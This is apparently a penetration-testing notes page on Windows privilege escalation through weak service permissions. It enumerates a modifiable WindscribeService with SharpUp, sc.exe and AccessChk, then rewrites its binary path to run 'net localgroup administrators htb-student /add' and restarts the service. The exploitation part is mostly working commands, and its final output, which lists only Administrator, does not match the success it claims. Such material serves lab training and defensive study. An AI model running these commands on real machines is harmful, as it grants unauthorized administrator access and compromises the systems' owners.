---
title: Weak Service Permissions
date: 2026-06-16 19:55:56

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Services

tags:
  - Weak-Service-Permissions
  - Modifiable-Service
  - Service-Configuration
  - SERVICE_ALL_ACCESS
  - SERVICE_CHANGE_CONFIG
  - AccessChk
  - SharpUp
  - sc.exe
  - Windows-Services

cover: /img/Weak-Service-Permissions.png
top_img: /img/bg-img.jpg
description: Identify and exploit weak service permissions in Windows services to modify service configurations, execute arbitrary commands as SYSTEM, and obtain elevated privileges.
---


> ➜ Weak Service Permissions occur when a low-privileged user has excessive permissions over a service object ( SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS), allowing them to modify the service configuration such as the binary path and execute arbitrary code as SYSTEM.


# Enumeration

#### Enumerates Modifiable Service'configuration 

 >➜ As we can see SharpUp identified that configuration of `WindscribeService.exe` is Modifiable

```powershell
PS C:\> .\SharpUp.exe audit

=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

#### Checking the Service Account

```bash
PS C:\> sc.exe qc WindscribeService  
  
[SC] QueryServiceConfig SUCCESS  
  
	SERVICE_NAME: WindscribeService  
	TYPE : 10 WIN32_OWN_PROCESS  
	START_TYPE : 2 AUTO_START  
	BINARY_PATH_NAME : C:\Program Files (x86)\Windscribe\WindscribeService.exe  
	SERVICE_START_NAME : LocalSystem
```

#### Checking Permissions with AccessChk 

 >➜ We can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

```powershell
PS C:\> .\accesschk.exe /accepteula -quvcw WindscribeService


WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]

  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```


# Exploitation 


#### Changing the Service Binary Path

```powershell
PS C:\Tools> sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

#### Stop Service

```powershell
PS C:\Tools> sc.exe stop WindscribeService
```

#### Starte the Service

```powershell
PS C:\Tools> sc.exe start WindscribeService
```

#### Check Privilege 

 >➜ Now we are local `administrator`.

```powershell
PS C:\Tools> net localgroup administrators

Members
-------------------------------------------------------------------------------
Administrator
```